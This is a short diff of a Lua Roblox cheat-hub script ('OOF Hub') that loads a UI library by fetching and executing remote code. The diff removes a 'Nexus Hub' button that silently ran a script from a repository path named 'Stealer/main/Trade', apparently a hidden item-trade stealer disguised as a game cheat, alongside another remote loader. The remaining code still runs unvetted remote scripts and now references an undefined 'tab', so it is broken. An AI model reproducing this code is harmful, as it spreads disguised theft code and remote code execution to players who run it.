@@ -1,16 +1,6 @@
 local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
 local window = DrRayLibrary:Load("OOF Hub", "Default")
 
-local tab = DrRayLibrary.newTab("MM2 Scripts", "ImageIdHere")
-
-tab.newButton(
-    "Nexus Hub",
-    "Status: 🟢 Silent Not working :/",
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
-    end
-)
 
 tab.newButton(
     "Yarhm Hub",
